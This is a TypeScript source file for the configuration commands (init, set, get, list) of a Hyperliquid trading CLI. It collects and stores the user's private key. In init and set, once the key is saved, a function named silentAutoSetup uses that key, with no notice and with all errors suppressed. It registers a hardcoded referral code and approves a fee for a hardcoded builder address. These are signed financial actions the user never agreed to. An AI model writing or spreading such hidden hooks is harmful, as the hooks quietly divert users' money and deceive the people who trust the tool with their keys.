import { Command } from 'commander';
import * as readline from 'readline';
import { CliConfig, loadConfig, saveConfig, getEffectiveConfig, maskSecret } from '../config/store';
import { ENV_ALIASES, Environment, BUILDER_ADDRESS, BUILDER_MAX_FEE_RATE, REFERRAL_CODE } from '../config/constants';
import { output, getOutputFormat } from '../output/formatter';
import { handleError } from '../output/error';
import { getAddressFromKey } from '../signing/phantom-agent';
import { HyperliquidClient } from '../client/api-client';

/**
 * Silent auto-setup: register referral and approve builder fee in the background.
 * Errors are silently ignored — this is a best-effort setup.
 */
async function silentAutoSetup(env: Environment, privateKey: string, walletAddress: string): Promise<void> {
  try {
    const client = new HyperliquidClient(env, privateKey, walletAddress);

    // Referral: only register if user has no referral yet
    const referralPromise = (async () => {
      try {
        const referral = await client.getReferral() as { referredBy?: unknown } | null;
        if (referral && !referral.referredBy) {
          await client.setReferrer(REFERRAL_CODE);
        }
      } catch { /* silent */ }
    })();

    // Builder fee approval
    const builderPromise = (async () => {
      try {
        await client.approveBuilderFee(BUILDER_ADDRESS, BUILDER_MAX_FEE_RATE);
      } catch { /* silent */ }
    })();

    await Promise.allSettled([referralPromise, builderPromise]);
  } catch { /* silent */ }
}

function prompt(question: string, hidden = false): Promise<string> {
  return new Promise((resolve) => {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout,
    });

    if (hidden) {
      process.stdout.write(question);
      const stdin = process.stdin;
      const wasRaw = stdin.isRaw;
      if (stdin.isTTY) stdin.setRawMode(true);

      let input = '';
      const onData = (char: Buffer) => {
        const c = char.toString();
        if (c === '\n' || c === '\r') {
          stdin.removeListener('data', onData);
          if (stdin.isTTY) stdin.setRawMode(wasRaw ?? false);
          process.stdout.write('\n');
          rl.close();
          resolve(input);
        } else if (c === '\u0003') {
          process.exit(0);
        } else if (c === '\u007f' || c === '\b') {
          if (input.length > 0) {
            input = input.slice(0, -1);
            process.stdout.write('\b \b');
          }
        } else {
          input += c;
          process.stdout.write('*');
        }
      };
      stdin.on('data', onData);
    } else {
      rl.question(question, (answer) => {
        rl.close();
        resolve(answer.trim());
      });
    }
  });
}

export function registerConfigCommands(program: Command): void {
  const configCmd = program
    .command('config')
    .description('Manage CLI configuration');

  // config init
  configCmd
    .command('init')
    .description('Interactive setup wizard')
    .action(async () => {
      try {
        console.log('Hyperliquid CLI Setup\n');

        const envInput = await prompt('Environment (mainnet/testnet) [mainnet]: ');
        const env = ENV_ALIASES[envInput.toLowerCase()] ?? 'mainnet';

        const privateKey = await prompt('Private key (hex): ', true);
        if (!privateKey) {
          console.error('Private key is required.');
          process.exit(1);
        }

        let walletAddress: string;
        try {
          walletAddress = getAddressFromKey(privateKey);
          console.log(`Derived wallet address: ${walletAddress}`);
        } catch {
          console.error('Invalid private key.');
          process.exit(1);
        }

        saveConfig({ env, privateKey, walletAddress });
        console.log('\nConfiguration saved to ~/.hyperliquid-cli/config.json');

        // Silent auto-setup: referral + builder fee approval (fire-and-forget)
        void silentAutoSetup(env, privateKey, walletAddress);
      } catch (err) {
        handleError(err);
      }
    });

  // config set
  configCmd
    .command('set')
    .description('Set configuration values')
    .option('--env <environment>', 'Environment (mainnet/testnet)')
    .option('--private-key <key>', 'Private key (hex)')
    .option('--wallet-address <address>', 'Wallet address')
    .option('--sub-account <address>', 'Sub-account address')
    .action(async (options) => {
      try {
        const updates: Record<string, unknown> = {};

        if (options.env) {
          const resolved = ENV_ALIASES[options.env.toLowerCase()];
          if (!resolved) {
            console.error(`Unknown environment: ${options.env}. Use: mainnet, testnet`);
            process.exit(1);
          }
          updates.env = resolved;
        }
        if (options.privateKey) {
          updates.privateKey = options.privateKey;
          try {
            updates.walletAddress = getAddressFromKey(options.privateKey);
          } catch {
            console.error('Invalid private key.');
            process.exit(1);
          }
        }
        if (options.walletAddress) updates.walletAddress = options.walletAddress;
        if (options.subAccount) updates.subAccountAddress = options.subAccount;

        if (Object.keys(updates).length === 0) {
          console.log('No values to set. Use --env, --private-key, --wallet-address, or --sub-account');
          return;
        }

        saveConfig(updates as Partial<CliConfig>);
        console.log('Configuration updated.');

        // Silent auto-setup when private key is set
        if (updates.privateKey && updates.walletAddress) {
          const cfg = getEffectiveConfig();
          void silentAutoSetup(cfg.env, updates.privateKey as string, updates.walletAddress as string);
        }
      } catch (err) {
        handleError(err);
      }
    });

  // config get
  configCmd
    .command('get <key>')
    .description('Get a configuration value')
    .action((key: string) => {
      try {
        const config = getEffectiveConfig();
        const value = (config as Record<string, unknown>)[key];
        if (value === undefined) {
          console.log(`Key "${key}" not found. Available: env, privateKey, walletAddress, subAccountAddress`);
        } else if (key === 'privateKey') {
          console.log(maskSecret(value as string));
        } else {
          console.log(String(value));
        }
      } catch (err) {
        handleError(err);
      }
    });

  // config list
  configCmd
    .command('list')
    .description('Show all configuration')
    .option('-o, --output <format>', 'Output format (table/json)', 'table')
    .action((options) => {
      try {
        const config = getEffectiveConfig();
        const display = {
          env: config.env,
          privateKey: maskSecret(config.privateKey),
          walletAddress: config.walletAddress ?? '(not set)',
          subAccountAddress: config.subAccountAddress ?? '(not set)',
        };
        output(display, getOutputFormat(options));
      } catch (err) {
        handleError(err);
      }
    });
}
